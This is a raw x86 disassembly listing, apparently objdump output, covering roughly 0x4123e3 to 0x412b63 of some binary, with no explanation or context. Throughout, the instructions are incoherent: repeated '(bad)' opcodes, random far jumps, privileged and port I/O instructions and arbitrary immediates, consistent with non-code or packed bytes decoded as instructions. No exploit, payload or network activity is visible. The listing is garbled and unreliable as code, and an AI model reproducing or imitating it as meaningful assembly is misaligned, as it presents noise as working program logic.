  4123e3:	arpl   WORD PTR [edx-0x7af54f1d],dx
  4123e9:	push   ebx
  4123ea:	or     esi,DWORD PTR [ebp-0x28c3b333]
  4123f0:	lods   al,BYTE PTR ds:[esi]
  4123f1:	(bad)  
  4123f2:	jno    0x412440
  4123f4:	test   DWORD PTR [ebp-0x1b196c50],ebp
  4123fa:	sbb    DWORD PTR [esi+0x37],eax
  4123fd:	jmp    0xada7:0xa2e4c217
  412404:	push   0xffffffd0
  412406:	push   edx
  412407:	inc    edx
  412408:	xchg   BYTE PTR [ebp-0x602b87ee],dh
  41240e:	dec    eax
  41240f:	loope  0x412457
  412411:	mov    al,ds:0xbe7815de
  412416:	sub    eax,0x54ef567d
  41241b:	sub    ch,BYTE PTR [ebx+0x4f67693a]
  412421:	dec    ebp
  412422:	sub    eax,0x38e81370
  412427:	fisttp QWORD PTR [edx+0x34c2c8ca]
  41242d:	and    al,0x40
  41242f:	sbb    al,0xc5
  412431:	and    edx,edx
  412433:	pushf  
  412434:	stc    
  412435:	jmp    0xeb45:0xdb0eefe8
  41243c:	leave  
  41243d:	sub    DWORD PTR [edx],esp
  41243f:	addr16 sbb eax,ecx
  412442:	test   eax,0xfe5ae674
  412447:	cmovno edi,DWORD PTR [edi+ebp*2]
  41244b:	iret   
  41244c:	outs   dx,BYTE PTR ds:[esi]
  41244d:	popf   
  41244e:	jge    0x4124c6
  412450:	fdiv   QWORD PTR [ebp+0x12]
  412453:	pop    ecx
  412454:	xor    al,0x6a
  412456:	sti    
  412457:	lods   eax,DWORD PTR ds:[esi]
  412458:	inc    esp
  412459:	xor    al,cl
  41245b:	pop    ebp
  41245c:	pusha  
  41245d:	mov    cl,0x4e
  41245f:	stos   BYTE PTR es:[edi],al
  412460:	mov    ah,0x38
  412462:	jmp    DWORD PTR [edi]
  412464:	imul   esp,DWORD PTR [esp+ebp*1+0x754ec92],0x6
  41246c:	jne    0x5045b37f
  412472:	dec    esp
  412473:	xchg   edx,eax
  412474:	sahf   
  412475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412476:	fisubr DWORD PTR [edx]
  412478:	or     dh,ah
  41247a:	mov    esp,0xec4b9a7a
  41247f:	dec    ebx
  412480:	test   DWORD PTR [ecx-0x194c99c7],ebp
  412486:	in     al,0xc
  412488:	add    eax,0x8ed7b13e
  41248d:	jp     0x4124d9
  41248f:	enter  0x245e,0xe2
  412493:	ret    0x7d68
  412496:	lahf   
  412497:	xor    BYTE PTR [eax+0x69dfde98],dh
  41249d:	jo     0x412477
  41249f:	mov    ecx,0xa4fce0d5
  4124a4:	pop    ds
  4124a5:	repz mov dh,0x68
  4124a8:	fs in  eax,0xa3
  4124ab:	(bad)  
  4124ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ad:	mov    DWORD PTR [edi-0x5f],edi
  4124b0:	xchg   esp,eax
  4124b1:	and    edi,esp
  4124b3:	hlt    
  4124b4:	mov    cl,0xcd
  4124b6:	inc    edi
  4124b7:	mov    al,ds:0xd76a2b4
  4124bc:	and    ah,BYTE PTR [esp+eiz*8-0x2b]
  4124c0:	nop
  4124c1:	dec    edi
  4124c2:	mov    bh,ch
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	inc    ebx
  4124c6:	js     0x4124e7
  4124c8:	xchg   DWORD PTR [esi-0x63],esp
  4124cb:	xchg   esp,eax
  4124cc:	sub    DWORD PTR [esi+esi*1],edx
  4124cf:	nop
  4124d0:	call   0x3da4d1e
  4124d5:	fnstcw WORD PTR [edx-0x21]
  4124d8:	sub    dh,cl
  4124da:	inc    esi
  4124db:	adc    bh,al
  4124dd:	dec    edi
  4124de:	push   es
  4124df:	retf   0xa46a
  4124e2:	inc    ebx
  4124e3:	pop    ecx
  4124e4:	repz mov esi,esp
  4124e7:	adc    dl,BYTE PTR ss:[eax]
  4124ea:	cld    
  4124eb:	add    ebx,ecx
  4124ed:	ja     0x41255c
  4124ef:	xlat   BYTE PTR ds:[ebx]
  4124f0:	xor    al,al
  4124f2:	fld    st(0)
  4124f4:	shl    DWORD PTR [ebx+0x4051891b],0xf5
  4124fb:	add    al,0xaf
  4124fd:	aad    0x2b
  4124ff:	sub    dl,BYTE PTR [ebp+0x39]
  412502:	in     eax,dx
  412503:	xor    BYTE PTR [ebp+0x33],dh
  412506:	xor    edx,0x8a945cd0
  41250c:	mov    ss,WORD PTR [edx+0x28]
  41250f:	sbb    dl,BYTE PTR [esi+0x69]
  412512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412513:	int    0x43
  412515:	xor    al,0x8b
  412517:	dec    edx
  412518:	bndldx (bad),[ebx]
  41251b:	jnp    0x412533
  41251d:	xchg   ebp,eax
  41251e:	popf   
  41251f:	scas   eax,DWORD PTR es:[edi]
  412520:	xchg   ecx,eax
  412521:	jmp    0x5b0be88
  412526:	in     al,0x74
  412528:	dec    eax
  412529:	(bad)  
  41252a:	inc    ebp
  41252b:	fs (bad) 
  41252d:	adc    al,0xfa
  41252f:	ins    BYTE PTR es:[edi],dx
  412530:	outs   dx,BYTE PTR ds:[esi]
  412531:	in     al,dx
  412532:	stos   DWORD PTR es:[edi],eax
  412533:	push   esi
  412534:	adc    BYTE PTR [ebp+0x40],bh
  412537:	aad    0x7a
  412539:	loope  0x412567
  41253b:	jne    0x4124d4
  41253d:	pop    ebp
  41253e:	jg     0x412530
  412540:	and    al,0xf2
  412542:	shl    DWORD PTR [eax+edi*1+0x39],0x16
  412547:	scas   eax,DWORD PTR es:[edi]
  412548:	cmc    
  412549:	xor    ebx,DWORD PTR [eax]
  41254b:	mov    ebp,0x419247f6
  412550:	lods   eax,DWORD PTR ds:[esi]
  412551:	neg    DWORD PTR [edi+ebx*8-0x5d578ceb]
  412558:	add    ah,al
  41255a:	jno    0x4124e4
  41255c:	iret   
  41255d:	inc    edi
  41255e:	cmp    al,0xaf
  412560:	xchg   DWORD PTR [edi+0x3c],edx
  412563:	cs sti 
  412565:	stos   DWORD PTR es:[edi],eax
  412566:	or     BYTE PTR [edx-0x287ffd8f],bh
  41256c:	mul    DWORD PTR [ebp+ebp*2-0x4e]
  412570:	out    dx,eax
  412571:	iret   
  412572:	popa   
  412573:	xchg   esi,eax
  412574:	push   eax
  412575:	and    al,0x6f
  412577:	sbb    DWORD PTR [ebp-0x4bded304],ebp
  41257d:	arpl   WORD PTR [edi-0xf],bx
  412580:	jnp    0x412530
  412582:	xor    eax,0x525585c1
  412587:	or     al,0xd2
  412589:	test   BYTE PTR [eax],ch
  41258b:	inc    eax
  41258c:	ss pop ds
  41258e:	ss (bad) 
  412590:	fmul   QWORD PTR [edi-0x16da066b]
  412596:	xchg   esp,eax
  412597:	lea    ecx,[ecx]
  412599:	xchg   ebx,eax
  41259a:	add    BYTE PTR [eax],bl
  41259c:	stos   BYTE PTR es:[edi],al
  41259d:	sar    DWORD PTR [edi],1
  41259f:	cli    
  4125a0:	adc    bl,BYTE PTR [ecx-0x1d02cda7]
  4125a6:	lea    esp,[esi+0x745226e8]
  4125ac:	cmp    al,0xd1
  4125ae:	repnz lds esi,FWORD PTR [edx]
  4125b1:	(bad)  
  4125b3:	jo     0x4125aa
  4125b5:	(bad)
  4125b9:	inc    esi
  4125ba:	sti    
  4125bb:	daa    
  4125bc:	cwde   
  4125bd:	and    DWORD PTR ds:0xdf9902e0,ebp
  4125c3:	adc    cl,0xb0
  4125c6:	sbb    DWORD PTR [ebx-0x19863290],esi
  4125cc:	sub    al,0x70
  4125ce:	loop   0x412614
  4125d0:	mov    es,WORD PTR [edi-0x39]
  4125d3:	cld    
  4125d4:	mov    eax,ds:0xceb6e8f4
  4125d9:	xlat   BYTE PTR ds:[ebx]
  4125da:	inc    edi
  4125db:	add    DWORD PTR [edi+eax*8],edx
  4125de:	lods   eax,DWORD PTR ds:[esi]
  4125df:	div    esp
  4125e1:	fisttp WORD PTR [ebx-0x72]
  4125e4:	mov    bh,0x54
  4125e6:	sar    BYTE PTR [eax-0x50a0814],cl
  4125ec:	mov    eax,ds:0xd85fe0f6
  4125f1:	xchg   ebp,eax
  4125f2:	cmp    BYTE PTR [ebp-0x5a9db745],0x97
  4125f9:	and    al,0x74
  4125fb:	pop    edx
  4125fc:	and    al,0x28
  4125fe:	mov    ah,ch
  412600:	xchg   ebx,eax
  412601:	nop
  412602:	das    
  412603:	sub    edi,esp
  412605:	jge    0x412624
  412607:	xlat   BYTE PTR ds:[ebx]
  412608:	mov    eax,0x723798f9
  41260d:	mov    ds:0x816a6d5c,eax
  412612:	adc    BYTE PTR [edx-0x23],al
  412615:	push   ecx
  412616:	mov    ch,0x4d
  412618:	dec    edx
  412619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41261a:	mov    eax,ds:0x885eddc8
  41261f:	adc    ebx,DWORD PTR [edx+0x1fce6597]
  412625:	(bad)  
  412626:	or     dh,BYTE PTR [ecx]
  412628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412629:	inc    esp
  41262a:	add    esp,DWORD PTR [ebx]
  41262c:	jg     0x41265d
  41262e:	push   0xf0d4f2da
  412633:	mov    ebx,DWORD PTR [ebx]
  412635:	fwait
  412636:	jnp    0x412666
  412638:	xor    BYTE PTR [ebx],dh
  41263a:	popf   
  41263b:	loope  0x412658
  41263d:	cld    
  41263e:	push   ss
  41263f:	leave  
  412640:	mov    cl,0x3b
  412642:	or     DWORD PTR [eax],ebp
  412644:	sbb    esi,DWORD PTR [ecx-0x5b4fbde5]
  41264a:	push   0x31edda33
  41264f:	xchg   edi,eax
  412650:	or     ah,ch
  412652:	out    0x1a,al
  412654:	repz cdq 
  412656:	and    al,0xf2
  412658:	mov    DWORD PTR [esi+0x5d4a636],edi
  41265e:	imul   ebp,DWORD PTR [ecx+0x54e0c55b],0x7d2bb0f0
  412668:	mov    ds:0x950503bf,al
  41266d:	mov    ds:0x68f02414,eax
  412672:	arpl   WORD PTR [eax],cx
  412674:	push   esp
  412675:	mov    dl,0xa2
  412677:	xlat   BYTE PTR ds:[ebx]
  412678:	mov    esp,0xfa61f94b
  41267d:	les    eax,FWORD PTR [edx]
  41267f:	fstp   QWORD PTR [edi+0x57]
  412682:	sahf   
  412683:	inc    ecx
  412684:	mov    ecx,0xffb13eb7
  412689:	xor    DWORD PTR [ebx+0x6cb53d79],edx
  41268f:	and    ebp,DWORD PTR [ebp+0x36]
  412692:	mov    edi,DWORD PTR [eax+0xe9753e4]
  412698:	mov    ebp,0x1783db09
  41269d:	outs   dx,BYTE PTR ds:[esi]
  41269e:	mov    al,0xaa
  4126a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a1:	mov    ch,BYTE PTR [ebp-0x73def2ae]
  4126a7:	ja     0x4126f2
  4126a9:	stc    
  4126aa:	mov    al,0xd0
  4126ac:	iret   
  4126ad:	cli    
  4126ae:	ret    
  4126af:	xchg   ebp,ecx
  4126b1:	in     eax,0x8d
  4126b3:	fcos   
  4126b5:	sbb    eax,0xdac1a6c1
  4126ba:	adc    eax,0xf6de60b0
  4126bf:	rol    DWORD PTR [ecx],1
  4126c1:	sbb    eax,edi
  4126c3:	fcmovnu st,st(4)
  4126c5:	call   0x4b37d4e8
  4126ca:	in     eax,0x4e
  4126cc:	fnstsw WORD PTR es:[edi-0x41c8587b]
  4126d3:	jmp    0x7b61254b
  4126d8:	out    0x7b,eax
  4126da:	mov    DWORD PTR [ebx],0x7121b060
  4126e0:	push   esp
  4126e1:	xchg   DWORD PTR [edx+eiz*2],ebp
  4126e4:	mov    gs,edx
  4126e6:	outs   dx,DWORD PTR ds:[esi]
  4126e7:	icebp  
  4126e8:	pop    edx
  4126e9:	mov    cl,0x85
  4126eb:	xchg   ecx,eax
  4126ec:	outs   dx,DWORD PTR ds:[esi]
  4126ed:	cmp    esp,DWORD PTR [edx*8-0x4bb3222a]
  4126f4:	sub    al,0x10
  4126f6:	fucompp 
  4126f8:	ins    DWORD PTR es:[edi],dx
  4126f9:	lods   eax,DWORD PTR ds:[esi]
  4126fa:	fwait
  4126fb:	mov    edi,0x4ca26508
  412700:	(bad)  
  412701:	xchg   edx,eax
  412702:	inc    ebp
  412704:	pusha  
  412705:	mov    ds:0x3d816643,al
  41270a:	test   ecx,ebx
  41270c:	jnp    0x4126b4
  41270e:	pop    es
  41270f:	xor    bh,0x28
  412712:	test   BYTE PTR [ebx+0x39c6e3cb],al
  412718:	shl    esp,1
  41271a:	lods   al,BYTE PTR ds:[esi]
  41271b:	push   0xffffff95
  41271d:	xor    bl,bl
  41271f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412720:	xchg   esi,eax
  412721:	test   DWORD PTR [ebp-0x32c8b682],edi
  412727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412728:	dec    edi
  412729:	mov    al,ds:0xabdf416c
  41272e:	jg     0x412721
  412730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412731:	sub    eax,0xcccab884
  412736:	ds cmp esi,eax
  412739:	mov    esp,0x883abd62
  41273e:	jns    0x41272c
  412740:	adc    al,0x1a
  412742:	lock mov gs:0xf22a6bd6,al
  412749:	cdq    
  41274a:	outs   dx,DWORD PTR ds:[esi]
  41274b:	aas    
  41274c:	inc    BYTE PTR [esp+eiz*2+0x0]
  412750:	xlat   BYTE PTR ds:[ebx]
  412751:	and    al,0xe7
  412753:	xchg   BYTE PTR [esi],dh
  412755:	xchg   ebx,eax
  412756:	cmp    BYTE PTR [esi+0x1871ce6b],al
  41275c:	aas    
  41275d:	adc    BYTE PTR [edi-0x32],bh
  412760:	or     esp,DWORD PTR [ebx+0x10]
  412763:	xor    ah,bh
  412765:	addr16 mov al,ds:0x8d07
  412769:	popf   
  41276a:	scas   eax,DWORD PTR es:[edi]
  41276b:	clc    
  41276c:	cmp    BYTE PTR [esi+0x3f0f2486],dl
  412772:	mov    ah,0x4e
  412774:	data16 data16 sbb al,BYTE PTR [ebx]
  412778:	cmp    cl,BYTE PTR [ebp-0x2d391dac]
  41277e:	mov    ch,0x59
  412780:	adc    DWORD PTR [edi],esp
  412782:	mov    dl,0x18
  412784:	mov    bl,0xcf
  412786:	cmp    al,0xe6
  412788:	push   0x78
  41278a:	mov    eax,0xa0e8ea7b
  41278f:	stos   DWORD PTR es:[edi],eax
  412790:	xchg   BYTE PTR [esi+0x30908b35],bl
  412796:	push   0xffffff92
  412798:	mov    ?,ebp
  41279a:	arpl   WORD PTR [edi],di
  41279c:	loop   0x4127b9
  41279e:	push   0x59408da4
  4127a3:	hlt    
  4127a4:	jno    0x4127fb
  4127a6:	push   0xfffffffe
  4127a8:	jo     0x4127f8
  4127aa:	jnp    0x41280e
  4127ac:	jmp    0xef3eccda
  4127b1:	xor    cl,BYTE PTR [ebx]
  4127b3:	sub    bh,BYTE PTR [ecx+0x76]
  4127b6:	jmp    0x5ad7c69c
  4127bb:	daa    
  4127bc:	mov    ecx,gs
  4127be:	sbb    cl,BYTE PTR [ecx]
  4127c0:	out    dx,al
  4127c1:	retf   
  4127c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127c3:	(bad)  
  4127c5:	push   cs
  4127c6:	or     eax,0xe52af83
  4127cb:	xchg   DWORD PTR [ecx-0xd],esp
  4127ce:	inc    esi
  4127cf:	add    eax,0x5e2e6919
  4127d4:	add    al,0x5d
  4127d6:	dec    esp
  4127d7:	loopne 0x412820
  4127d9:	push   es
  4127da:	mov    bh,0x66
  4127dc:	jle    0x412797
  4127de:	xchg   BYTE PTR [esi+eax*8-0x4ceaa8c2],al
  4127e5:	idiv   bh
  4127e7:	sbb    al,0x6f
  4127e9:	in     al,0xe5
  4127eb:	add    eax,0x18d4f5c9
  4127f0:	into   
  4127f1:	sub    al,0xb3
  4127f3:	cmp    bl,BYTE PTR [edi]
  4127f5:	lods   al,BYTE PTR ds:[esi]
  4127f6:	pop    ebp
  4127f7:	dec    edi
  4127f8:	nop
  4127f9:	enter  0x3510,0x7a
  4127fd:	scas   al,BYTE PTR es:[edi]
  4127fe:	sbb    DWORD PTR [eax],0xd5b2cb88
  412804:	ss inc ebp
  412806:	xchg   ecx,eax
  412807:	cmp    BYTE PTR [esp+ebp*2-0x3521dfa],0x76
  41280f:	clc    
  412810:	pop    ss
  412811:	test   DWORD PTR ds:0x259ea614,ebp
  412817:	pop    ss
  412818:	mov    dl,BYTE PTR [edi]
  41281a:	pop    es
  41281b:	retf   
  41281c:	jg     0x412819
  41281e:	push   ecx
  41281f:	pop    es
  412820:	xchg   dh,bl
  412822:	mov    ds:0xf6fd6544,al
  412827:	pop    esp
  412828:	inc    edx
  412829:	xlat   BYTE PTR ds:[ebx]
  41282a:	mov    esi,0xb75416ac
  41282f:	into   
  412830:	pop    eax
  412831:	pushf  
  412832:	add    DWORD PTR [esi+edx*1-0x5465402],0x3f
  41283a:	aas    
  41283b:	aaa    
  41283c:	ds mov ah,0x3e
  41283f:	pushf  
  412840:	call   0xd035:0xf9e99b54
  412847:	lahf   
  412848:	fwait
  412849:	leave  
  41284a:	xchg   ebx,eax
  41284b:	inc    esi
  41284c:	mov    eax,ds:0xc13bfcfe
  412851:	jns    0x4128a6
  412853:	ret    
  412854:	ret    
  412855:	push   ebp
  412856:	int    0xbf
  412858:	mov    ecx,0x8534221c
  41285d:	mov    dh,0xa8
  41285f:	and    DWORD PTR [esi-0xf],0xb58636bb
  412866:	adc    ah,BYTE PTR [eax+edi*2-0x36]
  41286a:	ret    
  41286b:	xchg   DWORD PTR [edi+0x77],ebx
  41286e:	xor    edx,DWORD PTR [eax+0x55]
  412871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412872:	lods   eax,DWORD PTR ds:[esi]
  412873:	pop    ss
  412874:	mov    ebx,DWORD PTR [eax]
  412876:	mov    BYTE PTR [esi-0x3189f9a6],cl
  41287c:	std    
  41287d:	add    al,BYTE PTR [edi+edx*2+0x14]
  412881:	fsubr  DWORD PTR [ebx+0x1f1270d6]
  412887:	ret    
  412888:	ins    BYTE PTR es:[edi],dx
  412889:	out    dx,eax
  41288a:	xchg   esp,eax
  41288b:	sbb    esi,DWORD PTR [ebp+0x32111ee8]
  412891:	xchg   esp,eax
  412892:	retf   0x6302
  412895:	iret   
  412896:	adc    DWORD PTR [ecx],0x935949e4
  41289c:	aaa    
  41289d:	or     cl,BYTE PTR [edx-0x3485b1b9]
  4128a3:	xchg   ecx,ecx
  4128a5:	ret    0x309b
  4128a8:	nop
  4128a9:	dec    ebp
  4128aa:	mov    al,ds:0x377f278
  4128af:	or     bl,bh
  4128b1:	arpl   di,cx
  4128b3:	add    ah,BYTE PTR ds:[edx-0x20379454]
  4128ba:	ja     0x412917
  4128bc:	jmp    0xec5736bf
  4128c1:	sub    ah,BYTE PTR [esi]
  4128c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128c4:	pop    esi
  4128c5:	pop    edx
  4128c6:	data16 jecxz 0x41287e
  4128c9:	adc    eax,0x99282413
  4128ce:	or     eax,0xd337d28b
  4128d3:	aad    0x6b
  4128d5:	sub    edi,DWORD PTR [eax]
  4128d7:	test   eax,0x1843b01c
  4128dc:	sbb    BYTE PTR ds:0x8ecefa6f,bl
  4128e2:	cmp    al,0x1c
  4128e4:	(bad)  
  4128e5:	cmp    eax,0xce7de107
  4128ea:	or     al,0xdc
  4128ec:	add    eax,0xaa9ffec0
  4128f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128f2:	(bad)  
  4128f3:	sbb    al,0x64
  4128f5:	leave  
  4128f6:	gs jae 0x412882
  4128f9:	or     eax,0x2608421e
  4128fe:	lods   eax,DWORD PTR ds:[esi]
  4128ff:	xchg   BYTE PTR ds:0xe0d053ca,bl
  412905:	cli    
  412906:	pushf  
  412907:	ds push edi
  412909:	adc    DWORD PTR [ebx],esi
  41290b:	outs   dx,DWORD PTR ds:[esi]
  41290c:	mov    bl,0x57
  41290e:	mul    BYTE PTR [edx+0x43281f3a]
  412914:	ins    BYTE PTR es:[edi],dx
  412915:	mov    ds:0xd601dcd9,eax
  41291a:	pop    ebx
  41291b:	push   cs
  41291c:	pop    ecx
  41291d:	test   DWORD PTR [ebp+ecx*8+0x6e],esi
  412921:	pop    es
  412922:	and    eax,0xcf6dab5e
  412927:	inc    edx
  412928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412929:	scas   eax,DWORD PTR es:[edi]
  41292a:	stos   DWORD PTR es:[edi],eax
  41292b:	mov    dh,0x2d
  41292d:	add    ebx,DWORD PTR [edx]
  41292f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412930:	fnsave [edi+eax*2-0x26]
  412934:	out    dx,eax
  412935:	push   edi
  412936:	dec    edi
  412937:	xchg   ebx,eax
  412938:	mov    dl,0x21
  41293a:	es adc ecx,DWORD PTR gs:[edi+0x2a]
  41293f:	ret    0x5c55
  412942:	pushf  
  412943:	arpl   WORD PTR [ecx],dx
  412945:	fcmovnbe st,st(2)
  412947:	and    DWORD PTR [edx-0x319744f5],ecx
  41294d:	dec    edx
  41294e:	dec    edx
  41294f:	xchg   edi,eax
  412950:	xchg   esp,eax
  412951:	fbld   TBYTE PTR [esi]
  412953:	stos   BYTE PTR es:[edi],al
  412954:	jg     0x4129c4
  412956:	ds and eax,0x4a3d3bdd
  41295c:	ins    BYTE PTR es:[edi],dx
  41295d:	dec    edi
  41295e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41295f:	std    
  412960:	cmp    al,BYTE PTR [edi]
  412962:	add    bh,ah
  412964:	mov    al,ds:0xebd2f156
  412969:	dec    BYTE PTR [eax+0x28f7685f]
  41296f:	lods   al,BYTE PTR ds:[esi]
  412970:	enter  0x948c,0x87
  412974:	jb     0x4129ed
  412976:	fs inc esp
  412978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412979:	int3   
  41297a:	or     BYTE PTR [esi],cl
  41297c:	sub    al,BYTE PTR [ebp+0x27e98d8b]
  412982:	loope  0x4129b2
  412984:	pop    edi
  412985:	dec    ebp
  412986:	or     al,0xfe
  412988:	jp     0x4129ed
  41298a:	popa   
  41298b:	aaa    
  41298c:	scas   eax,DWORD PTR es:[edi]
  41298d:	sub    edx,DWORD PTR [ecx+0x71]
  412990:	fsubr  st,st(6)
  412992:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  412994:	sahf   
  412995:	test   eax,0x9d1471a3
  41299a:	sub    eax,DWORD PTR [ecx-0x77]
  41299d:	xchg   esi,eax
  41299e:	stos   DWORD PTR es:[edi],eax
  41299f:	test   BYTE PTR ds:[esi],ah
  4129a2:	sbb    al,BYTE PTR [ebp+0x671d51bf]
  4129a8:	out    0x98,eax
  4129aa:	popf   
  4129ab:	(bad)  
  4129ac:	jnp    0x41294a
  4129ae:	mov    bl,0x8e
  4129b0:	test   DWORD PTR [eax],ecx
  4129b2:	pop    esi
  4129b3:	jecxz  0x412a08
  4129b5:	pop    ebp
  4129b6:	repz xchg esp,eax
  4129b8:	lods   eax,DWORD PTR ds:[esi]
  4129b9:	lods   eax,DWORD PTR ds:[esi]
  4129ba:	ins    BYTE PTR es:[edi],dx
  4129bb:	cs mov eax,0xeabedec9
  4129c1:	fmul   QWORD PTR [edx+0x64ca5a25]
  4129c7:	xor    DWORD PTR [eax-0x30b11bd6],ebp
  4129cd:	and    BYTE PTR [ecx+0x69],0x44
  4129d1:	mov    al,0x74
  4129d3:	push   ss
  4129d4:	out    0x6c,al
  4129d6:	iret   
  4129d7:	mov    edi,0xe8e8d8fa
  4129dc:	retf   0xd753
  4129df:	adc    eax,0x914efbf1
  4129e4:	retf   0xa8f
  4129e7:	mov    esp,0x20871919
  4129ec:	fild   DWORD PTR [eax-0x5545a9bc]
  4129f2:	dec    ebx
  4129f3:	rol    ecx,0xf0
  4129f6:	xchg   ecx,eax
  4129f7:	or     al,0x52
  4129f9:	dec    eax
  4129fa:	push   ds
  4129fb:	retf   
  4129fc:	mov    cl,0x68
  4129fe:	dec    eax
  4129ff:	retf   0xdca8
  412a02:	stc    
  412a03:	cmp    DWORD PTR [ecx-0x53],0x9d2dac43
  412a0a:	push   edx
  412a0b:	push   edi
  412a0c:	xchg   ecx,eax
  412a0d:	mov    esp,0xf8c05ee5
  412a12:	outs   dx,DWORD PTR ds:[esi]
  412a13:	lods   al,BYTE PTR ds:[esi]
  412a14:	push   cs
  412a15:	dec    ecx
  412a16:	sbb    eax,0x4880c682
  412a1b:	pop    ebp
  412a1c:	cli    
  412a1d:	test   al,0x35
  412a1f:	pop    edi
  412a20:	cmp    eax,0xe6b83ec3
  412a25:	and    BYTE PTR [edx-0x6a],dh
  412a28:	dec    edx
  412a29:	xchg   ah,dl
  412a2b:	cmp    eax,0xcab78b57
  412a30:	paddsw mm3,QWORD PTR [edx]
  412a33:	(bad)  
  412a34:	ror    BYTE PTR [ecx],1
  412a36:	pop    edi
  412a37:	cmp    DWORD PTR [edx],esp
  412a39:	pop    ss
  412a3a:	jnp    0x412a5d
  412a3c:	push   ds
  412a3d:	jns    0x412a93
  412a3f:	shl    DWORD PTR [ebp+edi*4-0x7fbe03f8],cl
  412a46:	pop    esi
  412a47:	adc    DWORD PTR [edi],esi
  412a49:	dec    ecx
  412a4a:	retf   
  412a4b:	ds pusha 
  412a4d:	ret    
  412a4e:	stos   BYTE PTR es:[edi],al
  412a4f:	jb     0x412a6a
  412a51:	and    al,0x3
  412a53:	icebp  
  412a54:	pop    edx
  412a55:	cmc    
  412a56:	pop    ss
  412a57:	(bad)  
  412a58:	stos   DWORD PTR es:[edi],eax
  412a59:	or     al,0x6d
  412a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a5c:	stos   BYTE PTR es:[edi],al
  412a5d:	pcmpgtd mm5,mm7
  412a60:	xor    BYTE PTR [ebp+ebp*8-0x58722af7],0x87
  412a68:	lods   al,BYTE PTR ds:[esi]
  412a69:	popf   
  412a6a:	aaa    
  412a6b:	mov    ah,0xb4
  412a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a6e:	in     eax,0x49
  412a70:	push   edx
  412a71:	scas   eax,DWORD PTR es:[edi]
  412a72:	test   al,0x53
  412a74:	bound  ebx,QWORD PTR [esi-0x546a17da]
  412a7a:	and    eax,0xc38a9e80
  412a7f:	data16 add al,0x55
  412a82:	and    DWORD PTR fs:[edi+0x1c606377],edx
  412a89:	out    dx,al
  412a8a:	ins    DWORD PTR es:[edi],dx
  412a8b:	enter  0x77dd,0x57
  412a8f:	into   
  412a90:	mov    ds:0xcbcd9a7,eax
  412a95:	and    ebx,DWORD PTR [ebp-0x3e]
  412a98:	inc    ebp
  412a99:	push   edi
  412a9a:	imul   esi,DWORD PTR [ebx-0x24d0cf1],0x40f3a0ed
  412aa4:	sub    eax,0xc06ef38d
  412aa9:	jge    0x412ae1
  412aab:	es xchg ebp,eax
  412aad:	repnz pop ebx
  412aaf:	aad    0x7
  412ab1:	push   esi
  412ab2:	mov    ebp,0x9a5ce362
  412ab7:	fmul   DWORD PTR ds:0xd351d15
  412abd:	mov    WORD PTR [ecx],es
  412abf:	xchg   edi,eax
  412ac0:	adc    dh,BYTE PTR [edi]
  412ac2:	fisttp QWORD PTR [ebx]
  412ac4:	cmc    
  412ac5:	loopne 0x412b02
  412ac7:	mov    bl,0x96
  412ac9:	push   0xffffffd8
  412acb:	daa    
  412acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412acd:	add    esp,DWORD PTR [ebx+edx*8+0x2a599ca3]
  412ad4:	sub    BYTE PTR [edx-0x71634ebe],bl
  412ada:	pop    eax
  412adb:	sbb    DWORD PTR [ebx+esi*1-0x5121aec9],ecx
  412ae2:	int    0xcf
  412ae4:	outs   dx,BYTE PTR ds:[esi]
  412ae5:	jbe    0x412a80
  412ae7:	mov    bh,0x65
  412ae9:	ret    0xc4e6
  412aec:	jno    0x412b07
  412aee:	push   ebp
  412aef:	repnz cmp al,0x3d
  412af2:	dec    ecx
  412af3:	dec    ecx
  412af4:	rcl    ebx,0x7c
  412af7:	inc    edi
  412af8:	mov    ebp,0xbb86ead2
  412afd:	mov    edx,0x9451c5d5
  412b02:	sahf   
  412b03:	or     edx,DWORD PTR [ecx-0x586931ff]
  412b09:	scas   al,BYTE PTR es:[edi]
  412b0a:	sub    DWORD PTR [esi+0x21],eax
  412b0d:	mov    ebp,0xdbb1942c
  412b12:	jbe    0x412a96
  412b14:	aaa    
  412b15:	push   edi
  412b16:	lock sbb dh,BYTE PTR [edx-0x742d468e]
  412b1d:	das    
  412b1e:	nop
  412b1f:	dec    eax
  412b20:	adc    al,bh
  412b22:	mov    dh,0x27
  412b24:	pop    eax
  412b25:	and    eax,0x7ae8a65
  412b2a:	(bad)  
  412b2c:	cwde   
  412b2d:	out    0x3e,al
  412b2f:	sar    BYTE PTR [ebx+0x25],0x93
  412b33:	ret    
  412b34:	cvtps2pi mm2,xmm0
  412b37:	mul    DWORD PTR [ebp-0x61]
  412b3a:	push   cs
  412b3b:	xchg   edx,eax
  412b3c:	es jo  0x412b84
  412b3f:	shrd   DWORD PTR [ecx+0x1f],ecx,cl
  412b43:	fcmovb st,st(6)
  412b45:	push   DWORD PTR [edi]
  412b47:	and    BYTE PTR [edx+eax*2+0x53],ch
  412b4b:	fwait
  412b4c:	dec    edi
  412b4d:	sbb    al,BYTE PTR [ebp-0xd]
  412b50:	xchg   esi,eax
  412b51:	or     DWORD PTR [ebp-0x70c70edc],0x982ce749
  412b5b:	inc    edi
  412b5c:	jmp    0x97dc:0xb899424
  412b63:	or     eax,DWORD PTR [ecx-0x25]
